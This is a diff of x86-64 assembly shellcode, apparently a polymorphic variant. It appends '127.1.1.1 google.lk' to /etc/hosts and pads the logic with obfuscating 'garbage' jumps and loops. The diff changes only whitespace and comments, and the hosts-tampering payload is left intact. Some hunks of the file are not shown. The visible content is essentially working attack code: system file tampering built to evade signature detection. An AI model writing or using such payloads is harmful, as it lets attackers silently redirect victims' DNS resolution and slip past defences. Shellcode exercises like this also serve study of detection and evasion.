@@ -4,8 +4,8 @@ global _start
 _start:
 
 	jmp real_start
-        text db "127.1.1.1 google.lk"   ; 19 bytes
-        path db "/etc/hosts", 0x00      ; 10 bytes
+        text db "127.1.1.1 google.lk"   ; 19 bytes +1 from NULL
+        path db "/etc/hosts", 0x00      ; 10 bytes +1 from NULL
 
 real_start:
 
@@ -14,11 +14,11 @@ real_start:
     pop rax
     ; Instead the stack for the string, use rel addressing
     lea rdi, [rel text]
-	push rdi
-	pop r9
-	push rdi
-	pop rdi
-	add rdi, 19
+    push rdi
+    pop r9
+    push rdi
+    pop rdi
+    add rdi, 19
     xor rsi, rsi
     add si, 0x401
     ; Garbage jump
@@ -44,9 +44,8 @@ some_jump_3:
     pop rax
 
 write:
-    ;lea rsi, [rel text]
-	push r9
-	pop rsi
+    push r9
+    pop rsi
 
 garbage_jump_2:
 
@@ -60,15 +59,15 @@ garbage_jump_2:
     pop rax
     syscall
 
-	; Garbage
+    ; Garbage
 garbage_jump_3:				; Lot of garbage
-	push 10					; Just a bucle
-	pop rcx
+    push 10				; Just a bucle
+    pop rcx
 garbage_jump_3_loop:
-	push 60
-	pop rax
-	loop garbage_jump_3_loop
-	; End Garbage
+    push 60
+    pop rax
+    loop garbage_jump_3_loop
+    ; End Garbage
 
     ;exit
     xor rdi, rdi
